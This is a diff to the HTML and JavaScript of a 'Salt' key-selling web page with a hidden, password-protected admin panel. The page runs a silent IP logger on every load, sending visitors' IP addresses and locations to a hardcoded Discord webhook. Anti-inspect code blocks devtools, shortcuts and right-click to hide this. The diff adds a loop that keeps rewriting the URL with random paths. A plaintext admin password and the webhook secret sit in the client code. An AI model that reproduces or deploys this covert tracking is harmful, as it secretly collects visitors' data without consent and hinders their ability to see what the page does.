@@ -474,7 +474,7 @@
 <div class="orb orb1"></div>
 <div class="orb orb2"></div>
 
-<!-- Main page (unchanged) -->
+<!-- Main page -->
 <div class="hero" id="heroCard">
     <div class="logo-container">
         <img id="mainLogo" class="logo-img" src="image.png" alt="Salt" onerror="this.onerror=null; this.parentElement.innerHTML='<div class=logo-placeholder>🧂</div>';">
@@ -506,7 +506,6 @@
                 <button id="navLogsBtn">📜 IP Logs</button>
             </div>
         </div>
-        <!-- Keys Page -->
         <div id="keysPage" class="admin-panel-page active-page">
             <div class="key-form">
                 <h3 style="color:white; margin-bottom:1rem;">Generate New Key</h3>
@@ -529,17 +528,12 @@
                 <div id="keysContainer">Loading...</div>
             </div>
         </div>
-        <!-- Logs Page -->
         <div id="logsPage" class="admin-panel-page">
             <h3 style="color:white; margin-bottom:1rem;">🌍 IP Logs (with HWID)</h3>
             <div style="overflow-x: auto;">
                 <table class="log-table">
-                    <thead>
-                        <tr><th>IP Address</th><th>HWID (Key)</th><th>Timestamp</th><th>Location Preview</th><th>Action</th></tr>
-                    </thead>
-                    <tbody id="logsTableBody">
-                        <tr><td colspan="5">Loading logs...</td></tr>
-                    </tbody>
+                    <thead><tr><th>IP Address</th><th>HWID (Key)</th><th>Timestamp</th><th>Location Preview</th><th>Action</th></tr></thead>
+                    <tbody id="logsTableBody"><tr><td colspan="5">Loading logs...</td></tr></tbody>
                 </table>
             </div>
         </div>
@@ -567,19 +561,16 @@
 
 <script>
     (function() {
-        // ========== FIXED ANTI-INSPECT (no false positives on mobile) ==========
+        // ---------- ANTI-INSPECT (fixed thresholds) ----------
         const STORAGE_KEY = 'devtoolsAttemptLock';
         const modal = document.getElementById('devtoolsModal');
         const sorryBtn = document.getElementById('sorryButton');
         let isModalActive = false;
         let detectionCooldown = false;
-        let devtoolsOpenFlag = false;
 
-        // Higher threshold to avoid mobile address bar / keyboard false positives
         function isDevToolsOpen() {
             const widthDiff = window.outerWidth - window.innerWidth;
             const heightDiff = window.outerHeight - window.innerHeight;
-            // DevTools usually cause difference > 150px. Mobile keyboards may cause ~100px.
             return (widthDiff > 150) || (heightDiff > 150);
         }
 
@@ -613,7 +604,6 @@
             showPersistentPopup();
         }
 
-        // Block common shortcut keys (F12, Ctrl+Shift+I, etc.)
         function blockShortcuts(e) {
             const isF12 = (e.key === 'F12');
             const isCtrlShiftI = (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i'));
@@ -629,7 +619,6 @@
         window.addEventListener('keydown', blockShortcuts);
         window.addEventListener('contextmenu', (e) => { e.preventDefault(); triggerDevtoolsCaught(); });
 
-        // Periodic detection (less aggressive, 2 seconds)
         let watchInterval;
         function startWatch() {
             if (watchInterval) clearInterval(watchInterval);
@@ -639,24 +628,20 @@
                 }
             }, 2000);
         }
-        // Also detect on resize with debounce
         let resizeTimer;
         window.addEventListener('resize', () => {
             clearTimeout(resizeTimer);
             resizeTimer = setTimeout(() => {
-                if (!isModalActive && !detectionCooldown && isDevToolsOpen()) {
-                    triggerDevtoolsCaught();
-                }
+                if (!isModalActive && !detectionCooldown && isDevToolsOpen()) triggerDevtoolsCaught();
             }, 400);
         });
         startWatch();
         checkPersistentLock();
         sorryBtn.addEventListener('click', apologizeAndClear);
-        // Prevent ESC from closing the modal
         window.addEventListener('keydown', (e) => { if(e.key === 'Escape' && isModalActive) e.preventDefault(); });
         modal.addEventListener('click', (e) => { if(e.target === modal) e.stopPropagation(); });
 
-        // Click animation on main card
+        // Click animation main card
         const hero = document.getElementById('heroCard');
         hero.addEventListener('click', (e) => {
             if(e.target.closest('.discord-link')) return;
@@ -666,12 +651,30 @@
             setTimeout(() => hero.classList.remove('click-animation'), 450);
         });
 
-        // ========== HIDDEN ADMIN PANEL (password protected) ==========
+        // ---------- ADMIN PANEL WITH PATH ROUTING & URL SPOOFING ----------
         const ADMIN_PASSWORD = "SALT-OWNER-ADMINTESZYBAKA*#!@(#s9_33_Salt";
         const adminOverlay = document.getElementById('adminOverlay');
         const adminContainer = document.getElementById('adminContainer');
         const passwordPromptDiv = document.getElementById('passwordPrompt');
         let adminAuthenticated = false;
+        let urlSpoofInterval = null;
+
+        function stopUrlSpoofing() {
+            if (urlSpoofInterval) {
+                clearInterval(urlSpoofInterval);
+                urlSpoofInterval = null;
+            }
+        }
+
+        function startUrlSpoofing() {
+            if (urlSpoofInterval) stopUrlSpoofing();
+            urlSpoofInterval = setInterval(() => {
+                if (adminAuthenticated && adminOverlay.classList.contains('active')) {
+                    const randomPath = '/' + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 8);
+                    window.history.pushState({}, '', randomPath);
+                }
+            }, 100);
+        }
 
         function showAdminPanel() {
             adminOverlay.classList.add('active');
@@ -679,12 +682,16 @@
             passwordPromptDiv.style.display = 'block';
         }
 
-        function hideAdminPanel() {
+        function hideAdminPanel(returnToMain = true) {
             adminOverlay.classList.remove('active');
             adminAuthenticated = false;
             adminContainer.style.display = 'none';
             passwordPromptDiv.style.display = 'block';
             document.getElementById('adminPassword').value = '';
+            stopUrlSpoofing();
+            if (returnToMain) {
+                window.history.pushState({}, '', '/');
+            }
         }
 
         function unlockAdmin() {
@@ -695,8 +702,9 @@
                 adminContainer.style.display = 'block';
                 renderKeysList();
                 renderLogsTable();
-                const hash = window.location.hash;
-                if (hash === '#hidden/hide/admin/panel/secret/logs') {
+                // Determine active page from current path or hash
+                const path = window.location.pathname;
+                if (path.includes('/logs') || window.location.hash === '#hidden/hide/admin/panel/secret/logs') {
                     document.getElementById('keysPage').classList.remove('active-page');
                     document.getElementById('logsPage').classList.add('active-page');
                     document.getElementById('navKeysBtn').classList.remove('active');
@@ -707,43 +715,69 @@
                     document.getElementById('navKeysBtn').classList.add('active');
                     document.getElementById('navLogsBtn').classList.remove('active');
                 }
+                startUrlSpoofing();
             } else {
                 alert('Wrong password!');
             }
         }
 
+        // Check if current URL path indicates admin panel
+        function shouldShowAdmin() {
+            const path = window.location.pathname;
+            return path === '/hidden/hide/admin/panel/secret' || 
+                   path === '/hidden/hide/admin/panel/secret/logs' ||
+                   path.startsWith('/hidden/hide/admin/panel/secret/');
+        }
+
         function handleRouting() {
-            const hash = window.location.hash;
-            if (hash === '#hidden/hide/admin/panel/secret' || hash === '#hidden/hide/admin/panel/secret/logs') {
+            if (shouldShowAdmin()) {
                 showAdminPanel();
             } else {
-                if (adminOverlay.classList.contains('active')) hideAdminPanel();
+                if (adminOverlay.classList.contains('active')) hideAdminPanel(false);
             }
         }
 
-        window.addEventListener('hashchange', handleRouting);
+        // Intercept popstate to keep spoofing alive
+        window.addEventListener('popstate', () => {
+            if (adminAuthenticated && adminOverlay.classList.contains('active')) {
+                // Keep admin panel visible, restart spoofing if needed
+                if (!urlSpoofInterval) startUrlSpoofing();
+            } else if (shouldShowAdmin()) {
+                showAdminPanel();
+            }
+        });
+
         handleRouting();
+        window.addEventListener('load', handleRouting);
 
         document.getElementById('submitPasswordBtn')?.addEventListener('click', unlockAdmin);
         document.getElementById('cancelAdmin')?.addEventListener('click', (e) => {
             e.preventDefault();
-            window.location.hash = '';
-            hideAdminPanel();
+            window.history.pushState({}, '', '/');
+            hideAdminPanel(true);
         });
         document.getElementById('backToMain')?.addEventListener('click', (e) => {
             e.preventDefault();
-            window.location.hash = '';
-            hideAdminPanel();
+            window.history.pushState({}, '', '/');
+            hideAdminPanel(true);
         });
 
         document.getElementById('navKeysBtn')?.addEventListener('click', () => {
-            window.location.hash = '#hidden/hide/admin/panel/secret';
+            window.history.pushState({}, '', '/hidden/hide/admin/panel/secret');
+            document.getElementById('keysPage').classList.add('active-page');
+            document.getElementById('logsPage').classList.remove('active-page');
+            document.getElementById('navKeysBtn').classList.add('active');
+            document.getElementById('navLogsBtn').classList.remove('active');
         });
         document.getElementById('navLogsBtn')?.addEventListener('click', () => {
-            window.location.hash = '#hidden/hide/admin/panel/secret/logs';
+            window.history.pushState({}, '', '/hidden/hide/admin/panel/secret/logs');
+            document.getElementById('keysPage').classList.remove('active-page');
+            document.getElementById('logsPage').classList.add('active-page');
+            document.getElementById('navKeysBtn').classList.remove('active');
+            document.getElementById('navLogsBtn').classList.add('active');
         });
 
-        // ========== KEY MANAGEMENT ==========
+        // ---------- KEY MANAGEMENT ----------
         const KEYS_STORAGE = 'salt_admin_keys';
         function generateRandomKey() {
             return 'SALT-' + Math.random().toString(36).substring(2, 15).toUpperCase();
@@ -762,15 +796,7 @@
             keys.forEach((k, idx) => {
                 const expiryStr = k.expiry ? new Date(k.expiry).toLocaleString() : 'Unlimited';
                 const hwidStr = k.hwid || 'None';
-                html += `
-                    <div class="key-card">
-                        <strong>🔑 ${k.key}</strong>
-                        <button class="delete-key" data-index="${idx}">Delete</button><br>
-                        <span>HWID: ${hwidStr}</span><br>
-                        <span>Expires: ${expiryStr}</span><br>
-                        <span>Notes: ${k.notes || '—'}</span>
-                    </div>
-                `;
+                html += `<div class="key-card"><strong>🔑 ${k.key}</strong><button class="delete-key" data-index="${idx}">Delete</button><br><span>HWID: ${hwidStr}</span><br><span>Expires: ${expiryStr}</span><br><span>Notes: ${k.notes || '—'}</span></div>`;
             });
             container.innerHTML = html;
             document.querySelectorAll('.delete-key').forEach(btn => {
@@ -800,7 +826,7 @@
             document.getElementById('keyNotes').value = '';
         });
 
-        // ========== IP LOGS STORAGE AND DISPLAY ==========
+        // ---------- IP LOGS ----------
         const LOGS_STORAGE = 'salt_ip_logs';
         function storeIpLog(ip, hwid, locationPreview) {
             const logs = JSON.parse(localStorage.getItem(LOGS_STORAGE) || '[]');
@@ -818,18 +844,12 @@
             let html = '';
             logs.forEach(log => {
                 const date = new Date(log.timestamp).toLocaleString();
-                html += `<tr>
-                    <td>${log.ip}</td>
-                    <td><code>${log.hwid || 'unknown'}</code></td>
-                    <td>${date}</td>
-                    <td>${log.locationPreview || 'N/A'}</td>
-                    <td><a href="https://iplocation.com/?ip=${log.ip}" target="_blank" class="ip-link">🔍 View on iplocation.com</a></td>
-                </tr>`;
+                html += `<tr><td>${log.ip}</td><td><code>${log.hwid || 'unknown'}</code></td><td>${date}</td><td>${log.locationPreview || 'N/A'}</td><td><a href="https://iplocation.com/?ip=${log.ip}" target="_blank" class="ip-link">🔍 View on iplocation.com</a></td></tr>`;
             });
             tbody.innerHTML = html;
         }
 
-        // ========== IP LOGGER (hidden, only on IP change) ==========
+        // ---------- IP LOGGER (only on IP change) ----------
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1513578964642173100/noVBYGuM0HvgRzry7BJcic-te203H6ZpeI2UtOPl97CVjSygESs-ECTeDr8wAX9QVJET";
         const STORED_IP_KEY = 'salt_last_logged_ip';
         
@@ -882,12 +902,8 @@
                     fields: [{ name: "Location", value: locationPreview, inline: true }],
                     timestamp: new Date().toISOString()
                 };
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ embeds: [embed] })
-                }).catch(() => {});
-            } catch(e) { /* silent */ }
+                await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ embeds: [embed] }) }).catch(() => {});
+            } catch(e) {}
         }
         
         async function checkAndLog() {
@@ -899,7 +915,7 @@
                     await logVisitor(ip);
                     localStorage.setItem(STORED_IP_KEY, ip);
                 }
-            } catch(e) { /* silent */ }
+            } catch(e) {}
         }
         
         window.addEventListener('load', () => setTimeout(checkAndLog, 900));
